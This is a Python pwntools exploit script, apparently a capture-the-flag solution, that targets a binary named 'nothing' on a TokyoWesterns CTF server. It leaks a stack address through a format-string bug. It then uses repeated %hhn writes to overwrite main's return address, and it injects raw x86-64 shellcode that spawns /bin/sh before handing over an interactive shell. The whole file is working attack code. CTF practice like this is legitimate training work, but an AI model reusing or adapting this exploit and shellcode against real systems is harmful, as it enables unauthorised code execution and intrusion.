#!/usr/bin/env python
#encoding: utf-8;

from pwn import *
import sys

FILENAME = "./nothing"
LIBCNAME = ""

hosts = ("pwn02.chal.ctf.westerns.tokyo","localhost","localhost")
ports = (18247,12300,23947)
rhp1 = {'host':hosts[0],'port':ports[0]}    #for actual server
rhp2 = {'host':hosts[1],'port':ports[1]}    #for localhost 
rhp3 = {'host':hosts[2],'port':ports[2]}    #for localhost running on docker
context(os='linux',arch='amd64')
binf = ELF(FILENAME)
libc = ELF(LIBCNAME) if LIBCNAME!="" else None


## utilities #########################################

def hoge(msg):
  global c
  c.recvuntil("> ")
  c.send(msg)


## exploit ###########################################

def exploit():
  global c

  # leak stack
  msg = "%llx\n" 
  hoge(msg)
  stack = int(c.recvline().rstrip(),16)
  print("[+] stack: {}".format(hex(stack)))

  # overwrite RA of main
  target = p64(stack + 0x10)[:-2]
  for i in range(6):
    msg = b""
    msg += "%{}c".format(ord(target[i]))
    msg += "%14$hhn"
    msg += "A" * (0x40 - len(msg))
    msg += p64(stack + 0x108 + i)
    hoge(msg)

  # inject shellcode and jump there
  msg = b""
  msg += "q"*0x10
  msg += "\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05"
  hoge(msg)


## main ##############################################

if __name__ == "__main__":
    global c
    
    if len(sys.argv)>1:
      if sys.argv[1][0]=="d":
        cmd = """
          set follow-fork-mode parent
        """
        c = gdb.debug(FILENAME,cmd)
      elif sys.argv[1][0]=="r":
        c = remote(rhp1["host"],rhp1["port"])
      elif sys.argv[1][0]=="v":
        c = remote(rhp3["host"],rhp3["port"])
    else:
        c = remote(rhp2['host'],rhp2['port'])
    exploit()
    c.interactive()
